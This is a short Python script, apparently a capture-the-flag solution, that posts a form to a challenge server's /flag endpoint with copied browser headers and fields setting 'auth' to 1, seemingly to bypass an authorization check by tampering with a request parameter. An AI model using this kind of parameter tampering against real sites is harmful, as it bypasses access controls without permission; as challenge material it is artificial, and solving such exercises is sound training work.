import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Origin': 'http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/',
    'Accept-Language': 'en-US,en;q=0.9',
}

data = {
  'flag': '1',
  'auth': '1',
  'Submit': 'Submit'
}

response = requests.post('http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag', headers=headers, data=data, verify=False)
print(response.text)